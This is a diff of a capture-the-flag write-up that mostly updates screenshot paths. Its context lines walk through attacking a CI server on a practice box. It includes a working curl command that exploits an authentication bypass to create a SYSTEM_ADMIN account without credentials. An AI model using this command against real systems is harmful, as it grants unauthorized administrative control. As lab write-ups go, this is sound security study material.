@@ -6,23 +6,23 @@ description: Community Rating:Very hard
 
 So i start off by enumerating open ports:
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the website on port 80 i go to the login page:
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The website does not work and i need to put the webiste in my etc/hosts file as well as the vhost:
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 then i look up at the version number for any known exploits:
 
-<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and what stood out even more was a HackTheBox article:
 
-<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i tried exploiting this one, i rarely get HTB articles for a specific box so i gave it a go:
 
@@ -30,15 +30,15 @@ So i tried exploiting this one, i rarely get HTB articles for a specific box so 
 curl -s -X POST 'http://teams.onlyrands.com/idontexist?jsp=/app/rest/users;.jsp' -H "Content-Type: application/json" --data '{"username": "felix", "password": "felix", "email": "felix", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I am able to create a new admin user with ease and login:
 
-<figure><img src="../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 While looking at Queue, i look at the different stuff the freelances pushed to the instance and saw something funny:
 
-<figure><img src="../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
